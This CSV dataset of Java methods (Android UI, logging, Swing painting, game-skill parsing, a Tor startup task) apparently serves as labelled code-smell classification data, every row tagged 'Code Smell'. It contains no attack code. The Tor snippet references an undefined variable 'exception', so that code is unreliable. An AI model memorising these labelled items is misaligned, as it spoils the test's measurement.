text,label,text_label
"private void applyFilterMatrix(){
  if (outputEntry != null && photoFilterViewTextureView != null && previewContainer.getMeasuredWidth() > 0 && previewContainer.getMeasuredHeight() > 0) {
    Matrix photoFilterStartMatrix=new Matrix();
    photoFilterStartMatrix.reset();
    if (outputEntry.orientation != 0) {
      photoFilterStartMatrix.postRotate(-outputEntry.orientation,previewContainer.getMeasuredWidth() / 2f,previewContainer.getMeasuredHeight() / 2f);
      if (outputEntry.orientation / 90 % 2 == 1) {
        photoFilterStartMatrix.postScale((float)previewContainer.getMeasuredWidth() / previewContainer.getMeasuredHeight(),(float)previewContainer.getMeasuredHeight() / previewContainer.getMeasuredWidth(),previewContainer.getMeasuredWidth() / 2f,previewContainer.getMeasuredHeight() / 2f);
      }
    }
    photoFilterStartMatrix.postScale(1f / previewContainer.getMeasuredWidth() * outputEntry.width,1f / previewContainer.getMeasuredHeight() * outputEntry.height);
    photoFilterStartMatrix.postConcat(outputEntry.matrix);
    photoFilterStartMatrix.postScale((float)previewContainer.getMeasuredWidth() / outputEntry.resultWidth,(float)previewContainer.getMeasuredHeight() / outputEntry.resultHeight);
    photoFilterViewTextureView.setTransform(photoFilterStartMatrix);
    photoFilterViewTextureView.invalidate();
  }
}",1,Code Smell
"private void fillFilterName(){
  if (!creatingNew || !TextUtils.isEmpty(newFilterName) && nameChangedManually) {
    return;
  }
  int flags=newFilterFlags & MessagesController.DIALOG_FILTER_FLAG_ALL_CHATS;
  var result=FolderIconHelper.getEmoticonFromFlags(flags);
  String newName=result.first;
  String newEmoticon=result.second;
  if (newName != null && newName.length() > MAX_NAME_LENGTH) {
    newName="""";
  }
  newFilterName=newName;
  if (folderTagsHeader != null) {
    folderTagsHeader.setPreviewText((newFilterName == null ? """" : newFilterName).toUpperCase(),false);
  }
  newFilterEmoticon=newEmoticon;
  RecyclerView.ViewHolder holder=listView.findViewHolderForAdapterPosition(nameRow);
  if (holder != null) {
    adapter.onViewAttachedToWindow(holder);
  }
}
",1,Code Smell
"/** 
 * Map the  {@link ILoggingEvent} data model onto the {@link LogRecordBuilder}. 
 */
private void mapLoggingEvent(LogRecordBuilder builder,ILoggingEvent loggingEvent,long threadId){
  String message=loggingEvent.getFormattedMessage();
  if (message != null) {
    builder.setBody(message);
  }
  if (supportsInstant && hasInstant(loggingEvent)) {
    setTimestampFromInstant(builder,loggingEvent);
  }
 else {
    long timestamp=loggingEvent.getTimeStamp();
    builder.setTimestamp(timestamp,TimeUnit.MILLISECONDS);
  }
  Level level=loggingEvent.getLevel();
  if (level != null) {
    builder.setSeverity(levelToSeverity(level));
    builder.setSeverityText(level.levelStr);
  }
  AttributesBuilder attributes=Attributes.builder();
  Object throwableProxy=loggingEvent.getThrowableProxy();
  Throwable throwable=null;
  if (throwableProxy instanceof ThrowableProxy) {
    throwable=((ThrowableProxy)throwableProxy).getThrowable();
  }
  if (throwable != null) {
    setThrowable(attributes,throwable);
  }
  captureMdcAttributes(attributes,loggingEvent.getMDCPropertyMap());
  if (captureExperimentalAttributes) {
    attributes.put(THREAD_NAME,loggingEvent.getThreadName());
    if (threadId != -1) {
      attributes.put(THREAD_ID,threadId);
    }
  }
  if (captureCodeAttributes) {
    StackTraceElement[] callerData=loggingEvent.getCallerData();
    if (callerData != null && callerData.length > 0) {
      StackTraceElement firstStackElement=callerData[0];
      String fileName=firstStackElement.getFileName();
      if (fileName != null) {
        attributes.put(CODE_FILEPATH,fileName);
      }
      attributes.put(CODE_NAMESPACE,firstStackElement.getClassName());
      attributes.put(CODE_FUNCTION,firstStackElement.getMethodName());
      int lineNumber=firstStackElement.getLineNumber();
      if (lineNumber > 0) {
        attributes.put(CODE_LINENO,lineNumber);
      }
    }
  }
  if (captureMarkerAttribute) {
    boolean skipLogstashMarkers=supportsLogstashMarkers && captureLogstashAttributes;
    captureMarkerAttribute(attributes,loggingEvent,skipLogstashMarkers);
  }
  if (supportsKeyValuePairs && captureKeyValuePairAttributes) {
    captureKeyValuePairAttributes(attributes,loggingEvent);
  }
  if (captureLoggerContext) {
    captureLoggerContext(attributes,loggingEvent.getLoggerContextVO().getPropertyMap());
  }
  if (captureArguments && loggingEvent.getArgumentArray() != null && loggingEvent.getArgumentArray().length > 0) {
    captureArguments(attributes,loggingEvent.getMessage(),loggingEvent.getArgumentArray());
  }
  if (supportsLogstashMarkers && captureLogstashAttributes) {
    captureLogstashAttributes(attributes,loggingEvent);
  }
  builder.setAllAttributes(attributes.build());
  builder.setContext(Context.current());
}",1,Code Smell
"private void addInstance(@IdRes final int viewId,@NonNull final Scene scene,@NonNull final String tag,@NonNull AnimationOrAnimatorFactory animationOrAnimatorFactory){
  ThreadUtility.checkUIThread();
  if (TextUtils.isEmpty(tag)) {
    throw new IllegalArgumentException(""tag can't be empty"");
  }
  if (scene == this) {
    throw new IllegalArgumentException(""GroupScene can't be added to itself"");
  }
  if (isAdded(scene)) {
    int currentSceneContainerViewId=mGroupSceneManager.findSceneViewId(scene);
    if (currentSceneContainerViewId != viewId) {
      String currentViewIdName=null;
      try {
        currentViewIdName=getResources().getResourceName(currentSceneContainerViewId);
      }
 catch (      Resources.NotFoundException exception) {
        currentViewIdName=String.valueOf(currentSceneContainerViewId);
      }
      throw new IllegalArgumentException(""Scene is already added to another container, viewId "" + currentViewIdName);
    }
    String currentSceneTag=mGroupSceneManager.findSceneTag(scene);
    if (!currentSceneTag.equals(tag)) {
      throw new IllegalArgumentException(""Scene is already added, tag "" + currentSceneTag);
    }
  }
 else {
    Scene previousScene=findSceneByTag(tag);
    if (previousScene != null) {
      throw new IllegalArgumentException(""already have a Scene "" + previousScene.toString() + "" with tag ""+ tag);
    }
  }
  if (scene.getParentScene() != null && scene.getParentScene() != this) {
    throw new IllegalArgumentException(""Scene already has a parent, parent "" + scene.getParentScene());
  }
  if (isSupportRestore() && scene.isSceneRestoreEnabled() && !SceneInstanceUtility.isConstructorMethodSupportRestore(scene)) {
    throw new IllegalArgumentException(""Scene "" + scene.getClass().getName() + "" must be a public class or public static class, ""+ ""and have only one parameterless constructor to be properly recreated from instance state."");
  }
  mGroupSceneManager.add(viewId,scene,tag,animationOrAnimatorFactory);
}
",1,Code Smell
"public static String getSystem(){
  String SYS=null;
  try {
    Properties prop=new Properties();
    prop.load(new FileInputStream(new File(Environment.getRootDirectory(),""build.prop"")));
    if (prop.getProperty(KEY_MIUI_VERSION_CODE,null) != null || prop.getProperty(KEY_MIUI_VERSION_NAME,null) != null || prop.getProperty(KEY_MIUI_INTERNAL_STORAGE,null) != null) {
      SYS=SYS_MIUI;
    }
 else     if (prop.getProperty(KEY_EMUI_API_LEVEL,null) != null || prop.getProperty(KEY_EMUI_VERSION,null) != null || prop.getProperty(KEY_EMUI_CONFIG_HW_SYS_VERSION,null) != null) {
      SYS=SYS_EMUI;
    }
 else     if (getMeizuFlymeOSFlag().toLowerCase().contains(""flyme"")) {
      SYS=SYS_FLYME;
    }
 else     if (!TextUtils.isEmpty(getProp(KEY_VERSION_VIVO))) {
      SYS=SYS_VIVO;
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
    if (Build.MANUFACTURER.equalsIgnoreCase(""HUAWEI"")) {
      SYS=SYS_EMUI;
    }
 else     if (Build.MANUFACTURER.equalsIgnoreCase(""xiaomi"")) {
      SYS=SYS_MIUI;
    }
 else     if (Build.MANUFACTURER.equalsIgnoreCase(""meizu"")) {
      SYS=SYS_FLYME;
    }
 else     if (Build.MANUFACTURER.equalsIgnoreCase(""vivo"")) {
      SYS=SYS_VIVO;
    }
    return SYS;
  }
  return SYS;
}
",1,Code Smell
"@Override public boolean onKeyUp(int keyCode,KeyEvent event){
  if (keyCode == KeyEvent.KEYCODE_MENU) {
    if (!mDragController.isDragging() && !mWorkspace.isSwitchingState() && isInState(NORMAL)) {
      closeOpenViews();
      if (Utilities.isRunningInTestHarness()) {
        Log.d(TestProtocol.PERMANENT_DIAG_TAG,""Opening options popup on key up"");
      }
      showDefaultOptions(-1,-1);
    }
    return true;
  }
  return super.onKeyUp(keyCode,event);
}",1,Code Smell
"/** 
 * There is a problem in Swing, when using scale factors that end on .25 or .75 (e.g. 1.25, 1.75, 2.25, etc) and repainting single components, which may not repaint right and/or bottom 1px edge of component. <p> The component is first painted to an in-memory image, and then that image is copied to the screen. See  {@code javax.swing.RepaintManager.PaintManager#paintDoubleBufferedFPScales()}. <p> There are two clipping rectangles involved when copying the image to the screen: {@code sun.java2d.SunGraphics2D#devClip} and{@code sun.java2d.SunGraphics2D#usrClip}. <p> {@code devClip} is the device clipping in physical pixels.It gets the bounds of the painting component, which is either the passed component, or if it is non-opaque, then the first opaque ancestor of the passed component. It is calculated in  {@code sun.java2d.SunGraphics2D#constrain()} whilegetting a graphics context via  {@link JComponent#getGraphics()}. <p> {@code usrClip} is the user clipping, which is set via {@link Graphics} clipping methods.This is done in  {@code javax.swing.RepaintManager.PaintManager#paintDoubleBufferedFPScales()}. <p> The intersection of  {@code devClip} and {@code usrClip}(computed in  {@code sun.java2d.SunGraphics2D#validateCompClip()}) is used to copy the image to the screen. <p> Unfortunately different scaling/rounding strategies are used to calculate the two clipping rectangles, which is the reason of the issue. <p> {@code devClip} (see {@code sun.java2d.SunGraphics2D#constrain()}): <pre> {@code int devX = (int) (x * scale); int devWidth = Math.round( width * scale )}</pre> {@code usrClip} (see {@code javax.swing.RepaintManager.PaintManager#paintDoubleBufferedFPScales()}): <pre> {@code int usrX = (int) Math.ceil( (x * scale) - 0.5 ); int usrWidth = ((int) Math.ceil( ((x + width) * scale) - 0.5 )) - usrX;}</pre> X/Y coordinates are always rounded down for  {@code devClip}, but rounded up for  {@code usrClip}. Width/height calculation is also different.
 */
private static boolean needsSpecialRepaint(Component c,int x,int y,int width,int height){
  if (!SystemInfo.isJava_9_orLater || !SystemInfo.isWindows)   return false;
  if (width <= 0 || height <= 0 || c == null)   return false;
  int compWidth=c.getWidth();
  int compHeight=c.getHeight();
  if (compWidth <= 0 || compHeight <= 0)   return false;
  if (x + width < compWidth && y + height < compHeight)   return false;
  if (!c.isOpaque()) {
    int x2=x;
    int y2=y;
    for (Component p=c.getParent(); p != null; p=p.getParent()) {
      x2+=p.getX();
      y2+=p.getY();
      if (p.isOpaque()) {
        if (x2 + width < p.getWidth() && y2 + height < p.getHeight())         return false;
        break;
      }
    }
  }
  double scaleFactor=UIScale.getSystemScaleFactor(c.getGraphicsConfiguration());
  double fraction=scaleFactor - (int)scaleFactor;
  if (fraction == 0 || fraction == 0.5)   return false;
  return true;
}",1,Code Smell
"@SuppressWarnings(""SelfAssignment"") private static void paintOutlinedComponentImpl(Graphics2D g,int x,int y,int width,int height,float focusWidth,float focusWidthFraction,float focusInnerWidth,float borderWidth,float arc,Paint focusColor,Paint borderColor,Paint background,boolean scrollPane,double scaleFactor){
  if (scrollPane && scaleFactor != (int)scaleFactor) {
    if (focusWidth > 0) {
      int totalWidth=(int)(focusWidth + borderWidth);
      focusWidth=totalWidth - borderWidth;
    }
 else {
      borderWidth=(int)borderWidth;
    }
  }
  float x1=x + focusWidth;
  float y1=y + focusWidth;
  float w1=width - focusWidth * 2;
  float h1=height - focusWidth * 2;
  if (background != null) {
    g.setPaint(background);
    g.fill(createComponentRectangle(x1,y1,w1,h1,arc));
  }
  if (borderColor != null && borderColor.equals(focusColor)) {
    borderColor=null;
    focusInnerWidth=Math.max(focusInnerWidth,borderWidth);
  }
  float paintedFocusWidth=(focusWidth * focusWidthFraction) + focusInnerWidth;
  if (focusColor != null && paintedFocusWidth != 0) {
    float inset=focusWidth - (focusWidth * focusWidthFraction);
    float x2=x + inset;
    float y2=y + inset;
    float w2=width - (inset * 2);
    float h2=height - (inset * 2);
    float outerArc=arc + (focusWidth * 2);
    float innerArc=arc - (focusInnerWidth * 2);
    if (focusWidth > 0 && arc > 0 && arc < UIScale.scale(10))     outerArc-=UIScale.scale(2f);
    if (focusWidthFraction != 1)     outerArc=arc + ((outerArc - arc) * focusWidthFraction);
    g.setPaint(focusColor);
    paintOutline(g,x2,y2,w2,h2,paintedFocusWidth,outerArc,innerArc);
  }
  if (borderColor != null && borderWidth != 0) {
    g.setPaint(borderColor);
    paintOutline(g,x1,y1,w1,h1,borderWidth,arc);
  }
}",1,Code Smell
"public boolean parse(AvatarExcel avatarExcel){
  MazeSkill skill=null;
  for (  AbilityInfo ability : AbilityList) {
    List<MazeSkillAction> actionList=null;
    if (ability.getName().endsWith(""MazeSkill"")) {
      skill=new MazeSkill(avatarExcel,2);
      avatarExcel.setMazeSkill(skill);
      actionList=skill.getCastActions();
      var excel=GameData.getSummonUnitExcelMap().get((skill.getId() * 10) + 1);
      if (excel != null && !excel.isIsClient() && excel.getInfo() != null) {
        skill.getCastActions().add(new MazeSkillSummonUnit(excel,20));
      }
    }
 else     if (ability.getName().contains(""NormalAtk"")) {
      skill=new MazeSkill(avatarExcel,1);
      avatarExcel.setMazeAttack(skill);
      actionList=skill.getAttackActions();
    }
 else {
      continue;
    }
    for (    TaskInfo task : ability.getOnStart()) {
      parseTask(skill,actionList,task);
    }
  }
  return true;
}",1,Code Smell
"@Override protected Task<Tor> createTask(){
  return new Task<>(){
    private Exception startupException;
    @Override protected Tor call() throws Exception {
      Tor tor=Tor.getDefault();
      if (tor == null) {
        tor=new Tor();
        CallbackTorManager callbackTorManager=tor.getTorManager();
        callbackTorManager.addListener(new TorManagerEvent.Listener(){
          @Override public void managerEventAddressInfo(          @NotNull TorManagerEvent.AddressInfo info){
            if (!info.isNull) {
              try {
                startupLock.lock();
                startupCondition.signalAll();
              }
  finally {
                startupLock.unlock();
              }
            }
          }
        }
);
        callbackTorManager.start(throwable -> {
          if (throwable instanceof Exception) {
            startupException=exception;
          }
 else {
            startupException=new Exception(throwable);
          }
          log.error(""Error"",throwable);
          try {
            startupLock.lock();
            startupCondition.signalAll();
          }
  finally {
            startupLock.unlock();
          }
        }
,success -> {
          log.info(""Tor daemon started successfully"");
        }
);
        try {
          startupLock.lock();
          if (!startupCondition.await(5,TimeUnit.MINUTES)) {
            throw new TorStartupException(""Tor failed to start after 5 minutes, giving up"");
          }
          if (startupException != null) {
            throw startupException;
          }
        }
  finally {
          startupLock.unlock();
        }
      }
      return tor;
    }
  }
;
}",1,Code Smell
